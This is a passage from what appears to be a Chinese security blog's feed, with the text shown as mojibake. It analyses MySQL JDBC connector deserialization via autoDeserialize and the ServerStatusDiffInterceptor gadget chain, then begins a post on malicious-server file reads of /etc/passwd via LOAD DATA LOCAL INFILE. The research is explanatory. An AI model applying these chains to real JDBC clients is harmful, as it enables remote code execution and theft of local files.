DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.18ä»¥ä¸‹çš„5.1.xç‰ˆæœ¬ï¼šä¸å¯ç”¨</span></span><br><span class="line"><span class="comment">// 5.0.xç‰ˆæœ¬ä¸å¯ç”¨</span></span><br></pre></td></tr></table></figure><h3 id="æ€è·¯åˆ†æ"><a href="#æ€è·¯åˆ†æ" class="headerlink" title="æ€è·¯åˆ†æ"></a>æ€è·¯åˆ†æ</h3><p>çŸ¥å…¶ç„¶æ›´éœ€çŸ¥å…¶æ‰€ä»¥ç„¶ï¼Œä¸‹é¢å°è¯•åå‘å¤ç°æ˜¯å¦‚ä½•å‘ç°è¿™ä¸¤ä¸ªåˆ©ç”¨é“¾çš„</p><p>autoDeserializeæ˜¯æºå¤´ï¼Œä»autoDeserializeå‚æ•°å¼€å§‹åˆ†æ</p><h4 id="1-autoDeserializeçš„è°ƒç”¨æƒ…å†µ"><a href="#1-autoDeserializeçš„è°ƒç”¨æƒ…å†µ" class="headerlink" title="1. autoDeserializeçš„è°ƒç”¨æƒ…å†µ"></a>1. autoDeserializeçš„è°ƒç”¨æƒ…å†µ</h4><p><img src="/images/pasted-126.png" alt="upload successful"></p><pre><code>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœå­—æ®µç±»å‹æ˜¯Binaryæˆ–è€…BLOBï¼Œä¼šè¿›è¡Œååºåˆ—åŒ–ï¼Œå…¶ä¸­-84ã€-19ä¸º0xacedï¼Œjavaååºåˆ—åŒ–æ ‡å¿—ã€‚</code></pre><h4 id="2-åå‘è¿½è¸ª"><a href="#2-åå‘è¿½è¸ª" class="headerlink" title="2. åå‘è¿½è¸ª"></a>2. åå‘è¿½è¸ª</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ClientPreparedStatement.EmulatedPreparedStatementBindings</span><br><span class="line">    getObject(int)</span><br><span class="line">        2015 return this.bindingsAsRs.getObject(parameterIndex);</span><br><span class="line"></span><br><span class="line">DatabaseMetaData.ResultSetIterator</span><br><span class="line">    next()</span><br><span class="line">        146 return this.resultSet.getObject(this.colIndex).toString();</span><br><span class="line"></span><br><span class="line">ResultSetUtil</span><br><span class="line">    resultSetToMap(Map, ResultSet)</span><br><span class="line">        46 mappedValues.put(rs.getObject(1), rs.getObject(2));</span><br><span class="line">    resultSetToMap(Map, ResultSet, int, int)</span><br><span class="line">        53 mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line"></span><br><span class="line">UpdatableResultSet</span><br><span class="line">    syncUpdate()</span><br><span class="line">        1141 this.updater.setObject(i + 1, getObject(i + 1), fields[i].getMysqlType());</span><br></pre></td></tr></table></figure><ul><li><p>2.1. ClientPreparedStatement.EmulatedPreparedStatementBindings</p><p>  PreparedStatementæ˜¯é¢„ç¼–è¯‘ï¼Œè¿˜æ˜¯åªèƒ½åœ¨client é€šè¿‡ä¸»åŠ¨è°ƒç”¨getObjectè§¦å‘ï¼Œå¯¹åˆ©ç”¨æ— æ•ˆ</p></li><li><p>2.2. UpdatableResultSet</p><p>  UpdatableResultSetä¸ºæ›´æ–°Resultï¼Œæœªæ‰¾åˆ°åˆ©ç”¨ç‚¹</p></li></ul><h5 id="2-3-DatabaseMetaData-ResultSetIterator"><a href="#2-3-DatabaseMetaData-ResultSetIterator" class="headerlink" title="2.3. DatabaseMetaData.ResultSetIterator"></a>2.3. DatabaseMetaData.ResultSetIterator</h5><p>å°è¯•äº†å‡ ä¸ªé“¾ï¼Œéƒ½ä¸å¤ªå®ç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#setAutoCommit</span><br><span class="line">IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>å¤±è´¥ï¼ŒResultSetIteratoræ˜¯protectç±»ï¼Œæ— æ³•é€šè¿‡Class.forName(className).newInstance()å®ä¾‹åŒ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DatabaseMetaData#getTables&#x2F;getCloumnsç­‰</span><br><span class="line">DatabaseMetaData#getCatalogIterator</span><br><span class="line">DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>è§¦å‘å›°éš¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ConnectionImpl#prepareCall</span><br><span class="line">  CallableStatement#getInstance</span><br><span class="line">    CallableStatement#CallableStatement</span><br><span class="line">      CallableStatement#determineParameterTypes</span><br><span class="line">        DatabaseMetaData#getProcedureColumns</span><br><span class="line">          DatabaseMetaData#getProcedureOrFunctionColumns</span><br><span class="line">            DatabaseMetaData#getProceduresAndOrFunctions</span><br><span class="line">              DatabaseMetaData#getCatalogIterator</span><br><span class="line">                DatabaseMetaData.IterateBlock#doForAll</span><br><span class="line">                  DatabaseMetaData.ResultSetIterator#next</span><br></pre></td></tr></table></figure><p>è§¦å‘å›°éš¾</p><h5 id="2-4-ResultSetUtil"><a href="#2-4-ResultSetUtil" class="headerlink" title="2.4. ResultSetUtil"></a>2.4. ResultSetUtil</h5><p>æœ‰åˆ©ç”¨ç‚¹ï¼Œåå‘è¿½æº¯è¿‡ç¨‹å¦‚ä¸‹</p><h6 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h6><p>ResultSetUtil#resultSetToMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, ResultSet rs)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(<span class="number">1</span>), rs.getObject(<span class="number">2</span>));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">resultSetToMap</span><span class="params">(Map mappedValues, java.sql.ResultSet rs, <span class="keyword">int</span> key, <span class="keyword">int</span> value)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">       <span class="keyword">while</span> (rs.next()) &#123;</span><br><span class="line">           mappedValues.put(rs.getObject(key), rs.getObject(value));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>ServerStatusDiffInterceptor#populateMapWithSessionStatusValues</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">populateMapWithSessionStatusValues</span><span class="params">(Map&lt;String, String&gt; toPopulate)</span> </span>&#123;</span><br><span class="line">    java.sql.Statement stmt = <span class="keyword">null</span>;</span><br><span class="line">    java.sql.ResultSet rs = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            toPopulate.clear();</span><br><span class="line"></span><br><span class="line">            stmt = <span class="keyword">this</span>.connection.createStatement();</span><br><span class="line">            rs = stmt.executeQuery(<span class="string">&quot;SHOW SESSION STATUS&quot;</span>);</span><br><span class="line">            ResultSetUtil.resultSetToMap(toPopulate, rs);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br></pre></td></tr></table></figure><p>æ­¤å¤„äº†æ‰§è¡Œsql:SHOW SESSION STATUS</p><ul><li>evil mysql serverå¯æ§æƒ…å†µä¸‹ï¼Œå¯ä»¥è¿”å›å¯æ§çš„sqlç»“æœï¼Œä»è€Œè§¦å‘åç»­çš„ååºåˆ—åŒ–</li><li>å¦‚ä½•è§¦å‘populateMapWithSessionStatusValuesï¼Œç»§ç»­è·Ÿè¸ª</li></ul><p>å‘ç°ServerStatusDiffInterceptor#postProcesså’Œ#preProcessæœ‰ä¸¤å¤„è°ƒç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ServerStatusDiffInterceptor</span><br><span class="line">    postProcess(Supplier&lt;String&gt;, Query, T, ServerSession)</span><br><span class="line">        69 populateMapWithSessionStatusValues(this.postExecuteValues);</span><br><span class="line">    preProcess(Supplier&lt;String&gt;, Query)</span><br><span class="line">        105 populateMapWithSessionStatusValues(this.preExecuteValues);</span><br></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œå’Œç»“æœå·²ç»å¾ˆæ¥è¿‘äº†</p><ol><li>å‡å¦‚äº†è§£jdbc mysql çš„å‚æ•°ï¼ŒçŸ¥é“æœ‰ä¸ªå‚æ•°queryInterceptorsï¼Œé‚£å¯¹åº”èµ·æ¥å¾ˆå¿«å°±çŸ¥é“ç­”æ¡ˆäº†</li><li>ä½†æ˜¯æˆ‘æ˜¯ä¸äº†è§£çš„ï¼Œåªèƒ½è‹¦é€¼çš„ç»§ç»­è·Ÿè¸ªäº†</li></ol><p>NoSubInterceptorWrapper#preProcess</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">preProcess</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.underlyingInterceptor.preProcess(sql, interceptedQuery);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>NativeProtocol#invokeQueryInterceptorsPre</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">                T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">sendQueryPacket</span><span class="params">(Query callingQuery, NativePacketPayload queryPacket, <span class="keyword">int</span> maxRows, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (<span class="keyword">this</span>.queryInterceptors != <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                T interceptedResults = invokeQueryInterceptorsPre(query, callingQuery, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>NativeSession#execSQL</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">execSQL</span><span class="params">(Query callingQuery, String query, <span class="keyword">int</span> maxRows, NativePacketPayload packet, <span class="keyword">boolean</span> streamResults,</span></span></span><br><span class="line"><span class="function"><span class="params">...</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">try</span> &#123;</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">if</span> (packet == <span class="keyword">null</span>)</span> </span>&#123;</span><br><span class="line">                String encoding = <span class="keyword">this</span>.characterEncoding.getValue();</span><br><span class="line">                <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryString(callingQuery, query, encoding, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                        <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ((NativeProtocol) <span class="keyword">this</span>.protocol).sendQueryPacket(callingQuery, packet, maxRows, streamResults, catalog, cachedMetadata,</span><br><span class="line">                    <span class="keyword">this</span>::getProfilerEventHandlerInstanceFunction, resultSetFactory);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ConnectionImpl#setAutoCommit</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAutoCommit</span><span class="params">(<span class="keyword">final</span> <span class="keyword">boolean</span> autoCommitFlag)</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">...</span><br><span class="line">                    <span class="keyword">this</span>.session.execSQL(<span class="keyword">null</span>, autoCommitFlag ? <span class="string">&quot;SET autocommit=1&quot;</span> : <span class="string">&quot;SET autocommit=0&quot;</span>, -<span class="number">1</span>, <span class="keyword">null</span>, <span class="keyword">false</span>, <span class="keyword">this</span>.nullStatementResultSetFactory,</span><br><span class="line">                            <span class="keyword">this</span>.database, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…çœ‹è¿‡mysqlåè®®çš„éƒ½æ¸…æ¥šï¼Œloginä¹‹åï¼Œclientå’Œserverä¼šæ²Ÿé€šä¸€äº›å‚æ•°ï¼Œå…¶ä¸­å°±æœ‰autocommitï¼Œæ‰€ä»¥é“¾è·¯å¾„ä¸Šæ˜¯æ²¡é—®é¢˜äº†ï¼Œéœ€è¦è§£å†³çš„æ˜¯é“¾ä¸Šçš„è¯¸å¤šæ¡ä»¶<br><img src="/images/pasted-127.png" alt="upload successful"></p><h6 id="queryInterceptorsçš„åˆå§‹åŒ–"><a href="#queryInterceptorsçš„åˆå§‹åŒ–" class="headerlink" title="queryInterceptorsçš„åˆå§‹åŒ–"></a>queryInterceptorsçš„åˆå§‹åŒ–</h6><p>å…¶ä¸­é‡ç‚¹æ˜¯queryInterceptorså–å€¼é—®é¢˜ï¼Œæœ€å¼€å§‹å‡ºç°åœ¨NativeProtocol#sendQueryPacket</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T extends Resultset&gt; <span class="function">T <span class="title">invokeQueryInterceptorsPre</span><span class="params">(Supplier&lt;String&gt; sql, Query interceptedQuery, <span class="keyword">boolean</span> forceExecute)</span> </span>&#123;</span><br><span class="line">    T previousResultSet = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, s = <span class="keyword">this</span>.queryInterceptors.size(); i &lt; s; i++) &#123;</span><br><span class="line">        QueryInterceptor interceptor = <span class="keyword">this</span>.queryInterceptors.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> executeTopLevelOnly = interceptor.executeTopLevelOnly();</span><br><span class="line">        <span class="keyword">boolean</span> shouldExecute = (executeTopLevelOnly &amp;&amp; (<span class="keyword">this</span>.statementExecutionDepth == <span class="number">1</span> || forceExecute)) || (!executeTopLevelOnly);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (shouldExecute) &#123;</span><br><span class="line">            T interceptedResultSet = interceptor.preProcess(sql, interceptedQuery);</span><br></pre></td></tr></table></figure><p>è¿½æº¯å‘ç°</p><p>NativeProtocol#queryInterceptors<br>NativeSession#queryInterceptors<br>ConnectionImpl#queryInterceptors</p><p>æœ€ç»ˆå®šä½æ˜¯åœ¨initializeSafeQueryInterceptorsè¿›è¡Œçš„åˆå§‹åŒ–</p><p>ConnectionImpl#initializeSafeQueryInterceptors</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initializeSafeQueryInterceptors</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line"><span class="keyword">this</span>.queryInterceptors = Util</span><br><span class="line">                .&lt;QueryInterceptor&gt; loadClasses(<span class="keyword">this</span>.propertySet.getStringProperty(PropertyKey.queryInterceptors).getStringValue(),</span><br><span class="line">                        <span class="string">&quot;MysqlIo.BadQueryInterceptor&quot;</span>, getExceptionInterceptor())</span><br><span class="line">                .stream().map(o -&gt; <span class="keyword">new</span> NoSubInterceptorWrapper(o.init(<span class="keyword">this</span>, <span class="keyword">this</span>.props, <span class="keyword">this</span>.session.getLog()))).collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€ŒPropertyKeyï¼Œå¯ä»¥é€šè¿‡jdbc urlå‚æ•°è¿›è¡ŒæŒ‡å®šï¼Œé—®é¢˜è§£å†³ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬èŠ‚åœ¨è€å¸ˆå‚…ä»¬çš„æ–‡æ¡£åŸºç¡€ä¸Šï¼Œæ‰‹åŠ¨å¤ç°äº†jdbc mysql connector 8.0.14 cc7çš„ååºåˆ—åŒ–ï¼Œä»¥åŠä¸åŒç‰ˆæœ¬åœ¨ServerStatusDiffInterceptorå’ŒdetectCustomCollations ä¸¤ç§æ–¹å¼çš„ååºåˆ—åŒ–å¤ç°ï¼Œæ²¡æœ‰ä»€ä¹ˆæ–°çš„ä¸œè¥¿ã€‚</p><p>æ±‚æ¸”å¾—æ¸”ï¼ŒååŠéƒ¨åˆ†è¯•ç€åå‘å»æŒ–æ˜jdbc mysqlååºåˆ—åŒ–çš„åˆ©ç”¨é“¾ï¼Œåœ¨8.0.14ç‰ˆæœ¬ä¸Šå‘ç°äº†å‡ ä¸ªé¸¡è‚‹çš„é“¾ï¼Œæœ€ç»ˆå‘ç°ServerStatusDiffInterceptoré“¾ï¼Œè¿‡ç¨‹è™½ç„¶ç¨é•¿ï¼Œä¸è¿‡ä¹Ÿç®—æ˜¯æœ€å¤§çš„æ”¶è·ã€‚</p><p>è€æ ·å­ï¼ŒæŠ›å‡ ä¸ªé—®é¢˜</p><ol><li>åœ¨åå‘æ‰¾é“¾çš„æ—¶å€™ï¼Œå‘ç°æœ¬åœ°è¿˜æœ‰ä¸€äº›ç±»è°ƒç”¨äº†ResultSetUtil.getObjectï¼Œä¼šä¸ä¼šæœ‰æ–°çš„åˆ©ç”¨é“¾</li><li>Binaryç±»å‹ä¹Ÿæœ‰åŒæ ·çš„é—®é¢˜ï¼Œæµ‹è¯•ä¸‹ï¼Ÿ</li><li>ç›®å‰çœ‹æ¥autoDeserializeæ˜¯å¼ºç‰¹å¾ï¼Œå¥½åƒæ²¡ç»•è¿‡è¿™ä¸ªç‰¹å¾å§¿åŠ¿äº†</li></ol><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1] <a href="https://paper.seebug.org/1227/">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´ï¼ˆå››å“¥ï¼‰</a></li><li>[2] <a href="https://www.anquanke.com/post/id/203086">MySQL JDBC å®¢æˆ·ç«¯ååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆfnmsd@360ï¼‰</a></li><li>[3] <a href="https://xz.aliyun.com/t/9250">MySQL JDBC ååºåˆ—åŒ–åˆ†æï¼ˆ7tem7ï¼‰</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;å‚è€ƒã€1ã€‘ä¸­å››å“¥å·²ç»è®²çš„å¾ˆå…¨é¢ä¹Ÿå¾ˆè¯¦ç»†äº†ï¼Œç®€å•è®°å½•ä¸‹å¤ç°è¿‡ç¨‹å§&lt;/p&gt;
&lt;h2 id=&quot;MySQL-ååºåˆ—åŒ–&quot;&gt;&lt;a href=&quot;#MySQL-ååºåˆ—åŒ–&quot; class=&quot;headerlink&quot; title=&quot;MySQL ååºåˆ—åŒ–&quot;&gt;&lt;/a&gt;MySQL ååºåˆ—åŒ–&lt;/h2&gt;&lt;h3 id=&quot;autoDeserialize&quot;&gt;&lt;a href=&quot;#autoDeserialize&quot; class=&quot;headerlink&quot; title=&quot;autoDeserialize&quot;&gt;&lt;/a&gt;autoDeserialize&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/pasted-125.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;å¦‚è§£é‡Šï¼Œmysql clientä¼šè‡ªåŠ¨ååºåˆ—åŒ–serverç«¯ä¼ å›çš„BLOBç±»å‹&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="MySQL" scheme="http://m0d9.me/tags/MySQL/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc ç¢ç¢å¿µä¸€ï¼šMySQL Clientæ–‡ä»¶è¯»å–</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc%E7%A2%8E%E7%A2%8E%E5%BF%B5/</id>
    <published>2021-04-20T03:20:00.000Z</published>
    <updated>2021-04-21T09:36:24.245Z</updated>
    
    <content type="html"><![CDATA[<p>ä¹‹å‰Getäº†h2 initsqlçš„éªšå§¿åŠ¿ï¼Œäºæ˜¯æƒ³æ€»ç»“æ€»ç»“jdbc urlå¯æ§æƒ…å†µä¸‹çš„åˆ©ç”¨æ–¹æ³•ï¼Œç»å…¸çš„åœºæ™¯å°±æ˜¯jdbc mysql æ–‡ä»¶è¯»å–å’Œååºåˆ—åŒ–ï¼Œæ­£å¥½å‰ä¸ä¹…çš„Druid CVE-2021-26919çš„ç”¨çš„å°±æ˜¯jdbc mysqlååºåˆ—åŒ–æ¼æ´ï¼Œå­¦ä¹ å­¦ä¹ ï¼Œå±…ç„¶è¸©ä¸€äº›å‘ï¼Œå•ç‹¬è®°å½•ä¸‹æ¥ã€‚</p><p>mysql clientä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å†å²æ‚ ä¹…ï¼Œå‚è€ƒã€6ã€‘ä¸­æœ‰æåˆ°æ—©åœ¨13å¹´å°±æœ‰æå‡ºï¼Œä½†æ˜¯ä½œä¸ºmysql æ­£å¸¸åŠŸèƒ½ä¸€ç›´ä¿ç•™ã€‚ç›´åˆ°19å¹´blackhat å¼ æ¨å’Œå¯å¥• å¤§ä½¬å‘ç°ååºåˆ—åŒ–çš„åˆ©ç”¨åœºæ™¯ï¼ˆå‚è€ƒã€5ã€‘ï¼‰ï¼Œç›¸å…³ç ”ç©¶è¾¾åˆ°å°é«˜æ½®ï¼Œä¸è¿‡å¤šèµ˜è¿°ã€‚</p><h2 id="MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´"><a href="#MySQL-Clientæ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´"></a>MySQL Clientæ–‡ä»¶è¯»å–æ¼æ´</h2><h3 id="åŸç†ï¼šload-local-data"><a href="#åŸç†ï¼šload-local-data" class="headerlink" title="åŸç†ï¼šload local data"></a>åŸç†ï¼šload local data</h3><p>æ­£å¸¸çš„load local dataæµç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&quot;load data local infile &quot;&#x2F;etc&#x2F;passwd&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;&quot;</span><br><span class="line">serverï¼šå¥½çš„ï¼Œï¼ˆè¯†åˆ«sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&#x2F;etc&#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§</span><br><span class="line">clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&#x2F;etc&#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶</span><br></pre></td></tr></table></figure><p>æ”»å‡»æµç¨‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">clientï¼šç”³è¯·è·‘ä¸ªsqlï¼Œå†…å®¹æ˜¯&quot;***&quot;ï¼ˆjdbc-mysql-connectoré»˜è®¤è®¤è¯ç™»å½•å®Œæˆä¹‹åï¼Œä¼šæœ‰show variables&#x2F;select å‚æ•°ç­‰è¡Œä¸ºï¼‰</span><br><span class="line">serverï¼šå¥½çš„ï¼Œï¼ˆä¸ç®¡sqlå†…å®¹ï¼‰ï¼Œé‚£ä½ æŠŠ&#x2F;etc&#x2F;passwdæ–‡ä»¶è¯»å–ä¼ è¿‡æ¥å§</span><br><span class="line">clientï¼šå¥½çš„ï¼Œï¼ˆè¯»å–æœ¬åœ°&#x2F;etc&#x2F;passwdï¼‰ï¼Œè¿™æ˜¯æ–‡ä»¶å†…å®¹ï¼Œè¯·æŸ¥æ”¶</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="local-infile-amp-allowLoadLocalInfile"><a href="#local-infile-amp-allowLoadLocalInfile" class="headerlink" title="local-infile &amp; allowLoadLocalInfile"></a>local-infile &amp; allowLoadLocalInfile</h3><h4 id="local-infile"><a href="#local-infile" class="headerlink" title="local-infile"></a>local-infile</h4><p>mysql server æœ‰ä¸ªé…ç½®å‚æ•°ï¼Œåœ¨my.cnfä¸­å¯¹åº”çš„æ˜¯</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">local-infile</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥åœ¨sqlä¸­é€šè¿‡å…¨å±€å‚æ•°local_infileå®ç°</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> local_infile = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p><strong>* ä½†æ˜¯è¿™å¹¶æ²¡æœ‰ä»€ä¹ˆåµç”¨ *</strong></p><p>éœ€è¦å…³æ³¨çš„æ˜¯mysql-clientçš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡é…ç½®</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 